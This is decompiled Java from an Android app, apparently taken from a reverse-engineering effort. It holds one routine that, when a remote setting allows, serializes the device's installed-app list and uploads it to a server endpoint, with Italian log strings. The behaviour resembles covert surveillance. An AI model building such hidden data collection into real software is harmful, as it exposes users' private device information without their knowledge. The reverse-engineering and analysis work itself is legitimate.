package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.entity.AppInfo;
import com.app.system.common.h;
import com.google.gson.f;
import com.security.ServiceSettings;
import java.util.List;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class d
  extends a
{
  public d(String paramString)
  {
    super(null, paramString);
  }
  
  public int a(Context paramContext, List<AppInfo> paramList)
  {
    if (ServiceSettings.a().appListActive) {
      try
      {
        Object localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        ((StringBuilder)localObject).append("INVIO LISTA APP (tot. ");
        ((StringBuilder)localObject).append(paramList.size());
        ((StringBuilder)localObject).append(")");
        h.a(paramContext, ((StringBuilder)localObject).toString());
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/LogAppList");
        paramContext.append('/');
        paramContext.append(this.a);
        localObject = com.app.system.common.d.a.a.a.a(paramContext.toString(), h.b().a(paramList));
        if (localObject == null) {
          break label194;
        }
        paramList = ((Response)localObject).body().string();
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append("sendAppListToServer Result: ");
        paramContext.append(localObject);
        com.security.d.a.d("ProtocolForAppList", paramContext.toString(), new Object[0]);
        boolean bool = paramList.equals("1");
        if (!bool) {
          break label194;
        }
        return 1;
      }
      catch (Exception paramContext)
      {
        com.security.d.a.a("ProtocolForAppList", paramContext.getMessage(), new Object[0]);
      }
    } else {
      com.security.d.a.d("ProtocolForAppList", "Invio Lista App - Servizio disabilitato", new Object[0]);
    }
    label194:
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/d.class
 *
 * Reversed by:           J
 */